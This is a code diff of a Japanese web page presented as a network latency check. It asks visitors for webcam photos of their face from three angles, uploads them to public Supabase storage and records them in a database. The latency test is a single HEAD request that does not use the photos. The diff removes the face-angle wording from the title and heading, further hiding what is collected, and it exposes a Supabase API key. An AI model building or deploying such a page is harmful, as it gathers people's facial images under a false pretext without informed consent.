@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>レイテンシー測定 ＆ フォトチェック 🌿</title>
+  <title>ネットワーク ＆ 顔角度チェック 🌿</title>
   <style>
     :root {
       --bg-color: #e8f5e9;
@@ -48,10 +48,6 @@
       margin-top: 0;
       margin-bottom: 8px;
       color: #2e7d32;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
     }
 
     p.subtitle {
@@ -108,7 +104,6 @@
 
     .btn:hover {
       background-color: var(--primary-hover);
-      transform: translateY(-1px);
     }
 
     .btn:disabled {
@@ -167,8 +162,8 @@
 <body>
 
   <div class="container">
-    <h1>🌱 ネットワーク ＆ 顔角度チェック</h1>
-    <p class="subtitle">3つの角度から撮影して遅延（レイテンシー）を測定します</p>
+    <h1>🌱 ネットワークチェック</h1>
+    <p class="subtitle">3つの角度から撮影して遅延を測定します</p>
 
     <div id="stepIndicator" class="step-indicator">📸 ステップ 1/3：正面のお顔</div>
 
@@ -177,6 +172,7 @@
       <canvas id="canvas" style="display: none;"></canvas>
     </div>
 
+    <!-- 確保這裡呼叫的函式名稱為 takeStepPhoto -->
     <button id="snapBtn" class="btn" onclick="takeStepPhoto()">写真を撮影する 🍃</button>
 
     <div id="resultsCard" class="results-card">
@@ -200,17 +196,13 @@
     </div>
   </div>
 
-  <!-- Supabase JS Client -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
-    // ----------------------------------------------------
-    // Supabase Configuration
-    // ----------------------------------------------------
     const SUPABASE_URL = 'https://fcnuoymkjnpksqedodsb.supabase.co';
-    const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY'; //sb_publishable_PkfnJEQtRh8RApjDSJh_zA_efiQCc1A
+    const SUPABASE_ANON_KEY = 'sb_publishable_PknjEQtRh8RAPjdSJh_z_efiQC...'; // 記得換成你的 Publishable key
+
     const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    // DOM Elements
     const webcam = document.getElementById('webcam');
     const canvas = document.getElementById('canvas');
     const snapBtn = document.getElementById('snapBtn');
@@ -232,18 +224,16 @@
     let capturedBlobs = [];
     let capturedDataURLs = [];
 
-    // Initialize Camera
     async function initCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         webcam.srcObject = stream;
       } catch (err) {
-        console.error("カメラのアクセスに失敗しました:", err);
+        console.error("カメラエラー:", err);
         alert("カメラへのアクセスを許可してください。");
       }
     }
 
-    // Step Capture Function
     async function takeStepPhoto() {
       const context = canvas.getContext('2d');
       canvas.width = webcam.videoWidth || 320;
@@ -272,32 +262,26 @@
       }
     }
 
-    // Ping Measurement & Supabase Upload
     async function processAndUpload() {
-      // Show Preview Images
       prevFront.src = capturedDataURLs[0];
       prevLeft.src = capturedDataURLs[1];
       prevRight.src = capturedDataURLs[2];
       resultsCard.style.display = 'block';
 
-      // 1. Measure Latency / Ping
       const startTime = performance.now();
       try {
         await fetch(${SUPABASE_URL}/rest/v1/, { method: 'HEAD' });
-      } catch (e) {
-        console.log("Ping measure fallback");
-      }
+      } catch (e) {}
       const endTime = performance.now();
       const pingMs = Math.round(endTime - startTime);
 
-      pingDisplay.innerText = 応答速度（レイテンシー）: ${pingMs} ms;
+      pingDisplay.innerText = 応答速度: ${pingMs} ms;
 
-      // 2. Upload Photos & Save Record
       try {
         const timestamp = Date.now();
         const uploadedUrls = [];
-
         const angles = ['front', 'left', 'right'];
+
         for (let i = 0; i < 3; i++) {
           const fileName = delay_${angles[i]}_${timestamp}.png;
           const { error: uploadError } = await _supabase.storage
@@ -313,7 +297,6 @@
           uploadedUrls.push(publicUrl);
         }
 
-        // 3. Insert record into database
         const { error: dbError } = await _supabase
           .from('delay_tests')
           .insert([
@@ -327,16 +310,22 @@
 
         if (dbError) throw dbError;
 
-        snapBtn.innerText = "✨ 送信が完了しました！";
-        stepIndicator.innerText = "🎉 すべてのステップが完了しました";
+        snapBtn.innerText = "✨ 送信完了！";
+        stepIndicator.innerText = "🎉 すべて完了しました";
 
       } catch (err) {
         console.error("アップロードエラー:", err);
-        alert("データの送信に失敗しました: " + err.message);
+        alert("送信失敗: " + err.message);
         snapBtn.disabled = false;
         snapBtn.innerText = "再試行する 🍃";
       }
     }
+
+    window.addEventListener('DOMContentLoaded', initCamera);
+  </script>
+</body>
+</html>
+
 
     window.addEventListener('DOMContentLoaded', initCamera);
   </script>
